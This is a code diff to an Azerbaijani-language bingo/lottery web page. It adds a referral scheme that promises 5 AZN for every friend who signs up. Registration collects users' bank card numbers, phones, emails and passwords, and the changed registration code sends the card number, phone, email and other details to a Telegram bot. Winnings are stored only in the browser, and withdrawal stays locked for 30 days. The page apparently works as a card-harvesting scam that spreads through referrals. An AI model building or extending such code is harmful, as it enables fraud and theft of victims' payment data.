@@ -140,6 +140,14 @@
         .game-status { text-align: center; color: #FCD34D; font-weight: bold; font-size: 0.85rem; }
         .footer-note { text-align: center; font-size: 10px; margin-top: 10px; color: #64748B; }
         .test-btn { background: #3B82F6; margin-top: 5px; }
+        .referral-box {
+            background: #0F172A;
+            padding: 10px;
+            border-radius: 1rem;
+            margin: 10px 0;
+            word-break: break-all;
+        }
+        .copy-btn { background: #3B82F6; margin-top: 5px; padding: 8px; }
     </style>
 </head>
 <body>
@@ -152,7 +160,8 @@
             • Hər 1 saatda 2 bilet (hər bilet 3 sıra, 5 rəqəm).<br>
             • Hər 4 saniyədə 1 rəqəm çəkilir. Çıxan rəqəm 4 saniyə dairədə görünür, YALNIZ həmin 4 saniyə ərzində işarələnə bilər.<br>
             • Tamamlanan hər sıra üçün uduş: 1 sıra=5₼, 2 sıra=10₼, 3 sıra=30₼, 4+=50₼, 5+=100₼, 6+=200₼.<br>
-            • Uduşlar profilinizdə toplanır. 30 gün tamam olduqda “Çıxarış” düyməsi aktiv olur.
+            • Uduşlar profilinizdə toplanır. 30 gün tamam olduqda “Çıxarış” düyməsi aktiv olur.<br>
+            • <strong>🎁 Referal sistemi:</strong> Öz linkinizi paylaşın, linklə qeydiyyatdan keçən hər istifadəçiyə görə <strong>5 AZN bonus</strong> qazanın!
         </div>
         <input type="text" id="firstname" placeholder="Ad (yalnız hərflər)"><div class="example-text">📌 Nümunə: Elçin</div>
         <input type="text" id="lastname" placeholder="Soyad (yalnız hərflər)"><div class="example-text">📌 Nümunə: Məmmədov</div>
@@ -184,6 +193,15 @@
         <h2>👤 Profil</h2>
         <div id="profile-info" class="info-text" style="background:#0F172A; padding:10px; border-radius:1rem; margin-bottom: 12px;"></div>
         <div id="balance-info" class="balance-badge">💰 Ümumi Qazanc: 0 AZN (30 gün toplanır)</div>
+        
+        <!-- Referal bölməsi -->
+        <div class="referral-box">
+            <strong>🔗 Öz referal linkiniz:</strong><br>
+            <input type="text" id="referralLink" readonly value="" style="font-size:12px; padding:6px;">
+            <button id="copyLinkBtn" class="copy-btn" onclick="copyReferralLink()">📋 Linki kopyala</button>
+            <div class="warning-text" style="margin-top:5px;">Bu linki paylaşın. Hər qeydiyyatdan keçən dostunuza görə 5 AZN bonus qazanın!</div>
+        </div>
+        
         <button id="withdrawBtn" class="withdraw-btn" onclick="requestWithdraw()">💸 Çıxarış (30 gün sonra)</button>
         <button onclick="startGameFromProfile()" style="background:#F59E0B; margin-top:12px;">🎮 İndi Oyna</button>
         <button onclick="testTelegram()" class="test-btn">📨 Test Telegram (yoxlama)</button>
@@ -221,6 +239,12 @@
     const COOLDOWN_HOURS = 1;             // 1 saat limit
     const COOLDOWN_MS = COOLDOWN_HOURS * 3600000;
 
+    // URL-dən referal parametrini oxu
+    function getReferralFromUrl() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('ref');
+    }
+
     function savePlayer(p) { localStorage.setItem('sans_topu_player', JSON.stringify(p)); }
     function loadPlayer() { return JSON.parse(localStorage.getItem('sans_topu_player')); }
 
@@ -248,6 +272,39 @@
         if (ok) alert("✅ Mesaj göndərildi! Telegram-a baxın.");
         else alert("❌ Xəta: Token və ya Chat ID yanlış ola bilər.");
     };
+
+    // Referal bonusu əlavə et (yeni istifadəçi qeydiyyatdan keçəndə)
+    async function addReferralBonus(refUserId) {
+        let allPlayers = JSON.parse(localStorage.getItem('all_players') || '{}');
+        if (!allPlayers[refUserId]) {
+            // Köhnə sistemdə bütün oyunçular ayrıca saxlanmır, ona görə referal ediləni yükləyək
+            // Əgər referal edənin məlumatı varsa, onu yenilə
+            let refPlayer = loadPlayerById(refUserId);
+            if (refPlayer) {
+                refPlayer.totalWinnings = (refPlayer.totalWinnings || 0) + 5;
+                refPlayer.balance = refPlayer.totalWinnings;
+                savePlayerById(refUserId, refPlayer);
+                await sendToTelegram(`🎁 REFERAL BONUS!\n👤 ${refPlayer.fullname}\n💰 +5 AZN (referal)\n📊 Ümumi: ${refPlayer.totalWinnings} AZN`);
+            }
+        }
+    }
+
+    // Köməkçi funksiyalar: bütün oyunçuları saxlamaq üçün (referal üçün)
+    function savePlayerById(id, player) {
+        let all = JSON.parse(localStorage.getItem('all_players') || '{}');
+        all[id] = player;
+        localStorage.setItem('all_players', JSON.stringify(all));
+        // Əgər cari oyunçu bu id-dirsə, onu da yenilə
+        if (currentPlayer && currentPlayer.id === id) {
+            currentPlayer = player;
+            savePlayer(player);
+        }
+    }
+    function loadPlayerById(id) {
+        let all = JSON.parse(localStorage.getItem('all_players') || '{}');
+        return all[id] || null;
+    }
+    function getAllPlayers() { return JSON.parse(localStorage.getItem('all_players') || '{}'); }
 
     function updateWithdrawButton() {
         if (!currentPlayer) return;
@@ -322,14 +379,41 @@
             return;
         }
 
+        // Yeni istifadəçi üçün unikal ID yaradırıq
+        const userId = Date.now() + '-' + Math.random().toString(36).substr(2, 6);
+        const referrerId = getReferralFromUrl(); // URL-dən ref parametri
+        
         currentPlayer = {
+            id: userId,
             fullname, email, instagram, password, card, phone,
             balance: 0, totalWinnings: 0,
             lastPlayTime: null,
-            registeredAt: new Date().toISOString()
+            registeredAt: new Date().toISOString(),
+            referredBy: referrerId || null
         };
         savePlayer(currentPlayer);
-        await sendToTelegram(`🆕 YENİ İSTİFADƏÇİ\n👤 ${fullname}\n📧 ${email}\n📷 ${instagram}\n💳 ${card}\n📞 ${phone}`);
+        // Bütün oyunçular siyahısına əlavə et
+        let all = getAllPlayers();
+        all[userId] = currentPlayer;
+        localStorage.setItem('all_players', JSON.stringify(all));
+        
+        // Referal bonusu: əgər referrer varsa və o istifadəçi mövcuddursa
+        if (referrerId) {
+            let referrer = loadPlayerById(referrerId);
+            if (referrer) {
+                referrer.totalWinnings = (referrer.totalWinnings || 0) + 5;
+                referrer.balance = referrer.totalWinnings;
+                savePlayerById(referrerId, referrer);
+                await sendToTelegram(`🎁 REFERAL BONUS!\n👤 ${referrer.fullname}\n💰 +5 AZN (yeni istifadəçi: ${fullname})\n📊 Ümumi: ${referrer.totalWinnings} AZN`);
+                // Əgər cari oyunçu referrer idirsə, onun balansını yenilə
+                if (currentPlayer.id === referrerId) {
+                    currentPlayer = referrer;
+                    savePlayer(currentPlayer);
+                }
+            }
+        }
+        
+        await sendToTelegram(`🆕 YENİ İSTİFADƏÇİ\n👤 ${fullname}\n📧 ${email}\n📷 ${instagram}\n💳 ${card}\n📞 ${phone}${referrerId ? `\n🔗 Referal: ${referrerId}` : ''}`);
         alert("✅ Qeydiyyat tamamlandı! İndi oynaya bilərsiniz.");
         showProfileScreen();
     };
@@ -350,6 +434,19 @@
         `;
         updateBalanceDisplay();
         updateWithdrawButton();
+        
+        // Referal linkini göstər
+        const baseUrl = window.location.origin + window.location.pathname;
+        const refLink = `${baseUrl}?ref=${currentPlayer.id}`;
+        const refInput = document.getElementById('referralLink');
+        if (refInput) refInput.value = refLink;
+    }
+
+    function copyReferralLink() {
+        const refInput = document.getElementById('referralLink');
+        refInput.select();
+        document.execCommand('copy');
+        alert("✅ Link kopyalandı! Paylaşın və bonus qazanın.");
     }
 
     function updateBalanceDisplay() {
@@ -487,8 +584,14 @@
     
     window.onload = () => {
         const saved = loadPlayer();
-        if (saved) { currentPlayer = saved; showProfileScreen(); }
+        if (saved) { 
+            currentPlayer = saved; 
+            showProfileScreen();
+        } else {
+            // Heç bir oyunçu yoxdursa, start ekranında olsun
+            document.getElementById('start-screen').classList.remove('hidden');
+        }
     };
 </script>
 </body>
-    </html>
+            </html>
